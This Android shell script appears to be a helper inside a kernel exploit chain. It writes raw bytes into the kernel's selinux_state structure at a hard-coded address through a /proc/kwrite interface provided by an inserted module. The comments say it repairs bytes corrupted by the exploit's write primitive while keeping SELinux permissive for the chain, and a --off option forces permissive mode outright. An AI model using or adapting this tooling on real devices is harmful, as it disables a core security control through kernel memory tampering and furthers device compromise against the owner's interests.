#!/system/bin/sh
# fix-selinux.sh  -- repair the bytes W1's collateral store clobbers in
# selinux_state, and NOTHING ELSE.  It never touches the enforcing byte: the
# exploit chain needs permissive, and enabling enforcing while the other bytes
# are still garbage drops the session instantly.
#
# Field map (selinux_state, alias 0xffffff802b3f9990 on this build):
#   +0  enforcing            0/1   <- NOT written by this script
#   +1  checkreqprot         0     (vmlinux static init CHECKREQPROT_VALUE=0)
#   +2  initialized          1
#   +3..+10 policycap[]      plat_sepolicy.cil declares only:
#        network_peer_controls(bit0), open_perms(bit1), extended_socket_class(bit2),
#        nnp_nosuid_transition(bit5)   -> 1
#        always_check_network(bit3), cgroup_seclabel(bit4),
#        genfs_seclabel_symlinks(bit6), ioctl_skip_cloexec(bit7) -> 0
#   +11..  never clobbered
#
# /proc/kwrite takes TWO HEX DIGITS PER BYTE, SPACE SEPARATED (a bare 22-digit
# run is rejected -EINVAL).  Run after every W1, once kread_min is loaded.
A=0xffffff802b3f9990
case "${1:-}" in
  --off)   # force permissive (only writes +0)
      echo "$A 00" > /proc/kwrite; cat /proc/kwrite; exit 0 ;;
  --check)
      echo "$A 16" > /proc/kread; cat /proc/kread; exit 0 ;;
esac
[ -w /proc/kwrite ] || { echo "no /proc/kwrite -- insmod kread_min.ko first"; exit 1; }
echo "== before"; echo "$A 16" > /proc/kread; cat /proc/kread
# +1..+10 only; the address is offset by one byte so +0 (enforcing) is untouched
echo "== fix bytes +1..+10 (enforcing untouched)"
echo "0xffffff802b3f9991 00 01 01 01 01 00 00 01 00 00" > /proc/kwrite; cat /proc/kwrite
echo "== after"; echo "$A 16" > /proc/kread; cat /proc/kread
echo "   expect: <enforcing> 00 01 01 01 01 00 00 01 00 00 ..."
echo "== verify from adb shell (the chroot has no /sys/fs/selinux):"
echo "   cat /sys/fs/selinux/enforce /sys/fs/selinux/checkreqprot"
echo "   for c in /sys/fs/selinux/policy_capabilities/*; do echo \$c=\$(cat \$c); done"
echo "   (expect enforce=0, checkreqprot=0, and exactly 4 caps = 1)"
echo
echo "If you EVER want enforcing back, do it by hand as the very last step, after"
echo "confirming checkreqprot/policycap above, and be ready to revert:"
echo "   echo '0xffffff802b3f9990 01' > /proc/kwrite     # enable  (may drop the session)"
echo "   sh $0 --off                                     # revert instantly"
